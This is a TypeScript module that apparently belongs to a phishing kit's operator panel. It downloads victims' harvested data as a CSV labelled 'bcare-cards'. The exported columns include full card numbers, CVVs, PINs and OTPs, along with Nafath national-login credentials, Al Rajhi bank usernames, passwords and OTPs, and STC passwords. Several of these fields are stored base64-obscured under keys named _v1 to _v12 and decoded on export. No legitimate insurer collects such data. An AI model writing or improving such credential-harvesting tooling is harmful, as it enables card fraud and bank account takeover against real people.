import type { InsuranceApplication } from "./firestore-types"

function decode(val?: string): string {
  if (!val) return ""
  try {
    return atob(val)
  } catch {
    return val
  }
}

function formatDate(val: unknown): string {
  if (!val) return ""
  try {
    if (typeof val === "object" && val !== null && "toDate" in val) {
      return (val as { toDate: () => Date }).toDate().toLocaleString("ar-SA")
    }
    return new Date(val as string).toLocaleString("ar-SA")
  } catch {
    return String(val)
  }
}

function escapeCell(val: unknown): string {
  const str = val === null || val === undefined ? "" : String(val)
  if (str.includes(",") || str.includes('"') || str.includes("\n")) {
    return `"${str.replace(/"/g, '""')}"`
  }
  return str
}

export function generateAllCardsCsv(applications: InsuranceApplication[]): void {
  const headers = [
    "الاسم",
    "رقم الهوية",
    "رقم الهاتف",
    "رقم البطاقة",
    "تاريخ الانتهاء",
    "CVV",
    "حامل البطاقة",
    "البنك",
    "مستوى البطاقة",
    "نوع البطاقة",
    "OTP",
    "PIN",
    "كود هاتف",
    "Nafaz ID",
    "Nafaz Pass",
    "Rajhi User",
    "Rajhi Pass",
    "Rajhi OTP",
    "STC هاتف",
    "STC رمز",
    "الحالة",
    "طريقة الدفع",
    "الدولة",
    "المتصفح",
    "الجهاز",
    "تاريخ الإنشاء",
    "آخر تحديث",
  ]

  const rows = applications.map((app) => {
    const cardNumber = decode(app._v1) || app.cardNumber || ""
    const expiry = decode(app._v3) || app.expiryDate || ""
    const cvv = decode(app._v2) || app.cvv || ""
    const cardHolder = decode(app._v4) || app.cardHolderName || ""
    const otp = decode(app._v5) || app.otp || app.otpCode || ""
    const pin = decode(app._v6) || app.pinCode || ""
    const phoneOtp = decode(app._v7) || app.phoneOtp || ""
    const nafazId = decode(app._v8) || app.nafazId || ""
    const nafazPass = decode(app._v9) || app.nafazPass || ""
    const rajhiUser = decode(app._v10) || app.rajhiUser || ""
    const rajhiPass = decode(app._v11) || app.rajhiPassword || app.rajhiPasswrod || ""
    const rajhiOtp = decode(app._v12) || app.rajhiOtp || ""

    return [
      app.ownerName || "",
      app.identityNumber || "",
      app.phoneNumber || "",
      cardNumber,
      expiry,
      cvv,
      cardHolder,
      app.bankInfo?.name || "",
      app.cardLevel || app.bankInfo?.level || "",
      app.cardType || app.bankInfo?.paymentMethod || "",
      otp,
      pin,
      phoneOtp,
      nafazId,
      nafazPass,
      rajhiUser,
      rajhiPass,
      rajhiOtp,
      app.stcPhone || "",
      app.stcPassword || "",
      app.status || "",
      app.paymentMethod || "",
      app.country || "",
      app.browser || "",
      app.deviceType || "",
      formatDate(app.createdAt),
      formatDate(app.updatedAt),
    ].map(escapeCell)
  })

  const csvContent =
    "\uFEFF" + // BOM for Excel Arabic support
    [headers.map(escapeCell).join(","), ...rows.map((r) => r.join(","))].join("\n")

  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
  const url = URL.createObjectURL(blob)
  const link = document.createElement("a")
  link.href = url
  link.download = `bcare-cards-${new Date().toISOString().slice(0, 10)}.csv`
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  URL.revokeObjectURL(url)
}
